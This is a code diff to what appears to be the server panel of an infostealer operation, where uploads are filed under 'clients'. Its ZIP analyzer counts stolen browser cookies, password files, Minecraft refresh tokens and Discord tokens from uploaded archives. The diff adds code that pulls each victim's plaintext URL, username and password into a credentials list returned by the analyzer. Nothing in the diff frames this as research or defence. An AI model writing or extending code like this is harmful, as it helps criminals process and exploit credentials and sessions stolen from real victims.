@@ -58,7 +58,7 @@ const tlsOpts = {
   key:  fs.readFileSync(CFG.tlsKey),
 };
 
-// ─── ZIP ANALYZER (WITH DISCORD TOKENS) ──────────────────────────────────────
+// ─── ZIP ANALYZER ───────────────────────────────────────────────────────────
 function analyzeZip(filePath) {
     try {
         const zip = new AdmZip(filePath);
@@ -71,6 +71,7 @@ function analyzeZip(filePath) {
         let discordTokens = 0;
         let passwordFiles = [];
         let cookieFiles = [];
+        let creds = [];
         
         for (const entry of zipEntries) {
             if (entry.isDirectory) continue;
@@ -102,6 +103,11 @@ function analyzeZip(filePath) {
                     if (Array.isArray(parsed)) {
                         passwords += parsed.length;
                         passwordFiles.push({ name, count: parsed.length });
+                        for (const item of parsed) {
+                            if (item.url && item.user && item.pass) {
+                                creds.push({ url: item.url, user: item.user, pass: item.pass });
+                            }
+                        }
                     }
                 } catch {}
             } else if (lower.endsWith('refreshtokens.txt') || lower.includes('minecraft_auth')) {
@@ -114,9 +120,9 @@ function analyzeZip(filePath) {
                 discordTokens += lines.length;
             }
         }
-        return { netscapeCookies, jsonCookies, passwords, mcTokens, discordTokens, passwordFiles, cookieFiles };
+        return { netscapeCookies, jsonCookies, passwords, mcTokens, discordTokens, passwordFiles, cookieFiles, creds };
     } catch (e) {
-        return { netscapeCookies: 0, jsonCookies: 0, passwords: 0, mcTokens: 0, discordTokens: 0, passwordFiles: [], cookieFiles: [] };
+        return { netscapeCookies: 0, jsonCookies: 0, passwords: 0, mcTokens: 0, discordTokens: 0, passwordFiles: [], cookieFiles: [], creds: [] };
     }
 }
 
@@ -590,7 +596,7 @@ app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
   const [rows] = await db.query(`
     SELECT id, filename, stored_name, size, created_at FROM uploads
     WHERE user_id = ? AND client_id = ?
-    ORDER BY created_at DESC LIMIT 10
+    ORDER BY created_at DESC LIMIT 5
   `, [req.user.uid, clientId]);
   
   const result = rows.map(row => {
